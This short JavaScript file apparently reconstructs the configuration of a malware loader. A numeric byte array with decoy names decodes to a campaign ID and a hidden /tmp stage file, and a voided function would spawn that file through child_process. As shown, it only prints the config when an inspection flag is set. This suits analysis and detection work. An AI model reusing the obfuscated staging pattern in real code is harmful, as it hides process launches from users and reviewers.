// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_011dc50f = "[118,61,49,124,115,116,101,112,115,61,108,111,99,97,116,101,95,108,111,99,97,108,44,100,105,115,112,97,116,99,104,95,112,114,111,99,101,115,115,124,97,100,97,112,116,101,114,61,115,112,97,119,110,95,102,105,108,101,124,115,116,97,103,101,95,99,111,117,110,116,61,49,124,99,97,109,112,97,105,103,110,95,105,100,61,78,79,68,69,45,52,65,69,51,56,49,48,57,124,102,105,108,101,95,112,97,116,104,61,47,116,109,112,47,104,117,110,116,114,101,115,115,45,110,111,100,101,47,46,115,116,97,103,101,45,52,97,101,51,56,49,48,57,100,50,55,51,46,109,106,115]";
const Codec_011dc50f = "json_numbers|identity|";

function load_011dc50f() { return JSON.parse(Material_011dc50f); }
function decode_011dc50f(imagePixels) { return [...imagePixels]; }
async function recover_011dc50f() {
  const screenWidth = 19 * 7 - 133;
  const imagePixels = load_011dc50f(); let colorTable = [];
  switch (1) { case 1: colorTable = decode_011dc50f(imagePixels); break; default: throw new Error("state"); }
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_011dc50f() { return (await recover_011dc50f()).split("|").join("|"); }
async function plan_011dc50f() { const inspect = inspect_011dc50f; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "spawn_file", path: fields.file_path, module: "node:child_process" }); }
void moduleShape; void plan_011dc50f;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_011dc50f());

// reconstruction complete